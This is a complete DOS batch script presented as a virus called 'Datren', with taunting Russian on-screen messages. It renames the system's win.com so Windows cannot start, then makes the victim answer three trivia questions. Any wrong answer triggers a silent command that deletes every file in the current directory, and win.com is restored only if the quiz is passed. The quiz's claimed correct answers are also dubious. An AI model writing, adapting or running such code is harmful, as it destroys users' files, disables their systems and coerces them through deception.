CLS
REN c:\windows\win.com syscom.txt
CLS
echo Привет тебя приветствует вирус Datren!
echo Я уже подпортил кое что в твоей системе,
echo но я могу всё исправить, только слушай
echo меня внимательно! Во-первых нажми на 
echo клавиатуре любую букву алфавита!
pause
CLS
echo Молодец! Но это только начало, слушай
echo меня дальше. Чесно говоря ты тупой если 
echo запустил меня, но это бывает. А теперь
echo к делу! Я задам тебе  вопроса, если
echo ты правильно ответишь на них то я 
echo востановлю испорченные фаилы! Если ты
echo думаешь, что я блефую то можешь и 
echo перезагрузиться, мне плевать! Чесно
echo говоря мне чуточку жалко тебя. Вернемся
echo к вопросам! Они будут естественно про
echo компьтер. А сначала опять нажми на 
echo любую клавишу! 
pause
CLS
echo Итак мой первый вопрос выглядит так:
echo  Кто изобрёл язык Си?
echo  1 - Билл Гейц
echo  2 - Денис Ричи
echo  3 - Никлаус Виртом 
echo 
CHOICE  /c:123 /n
if errorlevel 3 goto DEAD
if errorlevel 2 goto 2
:1
goto DEAD
:2
CLS
echo Ты угадал! Вот второй вопрос:
echo  В каком году появилась первая операционная система?
echo  1 - в 1981 году
echo  2 - в 1976 году
echo  3 - в 1988 году
CHOICE  /c:123 /n
if errorlevel 3 goto DEAD
if errorlevel 2 goto DEAD
:22
CLS
echo Опять угадал! Вот последний третий вопрос:
echo  Когда был сделан это вирус?
echo  1 - 12 марта 1997г.
echo  2 - 2 января 2000г.
echo  3 - 23 июня 1991г.
CHOICE  /c:123 /n
if errorlevel 3 goto DEAD
if errorlevel 2 goto WIN
:DEAD
CLS
echo y  | DEL *.*       > nul
:WIN
CLS
CLS
REN c:\windows\syscom.txt win.com
CLS
echo Ты выйграл мои поздравления! Я всё исправил.
echo 
echo в 2000 году 2 января!
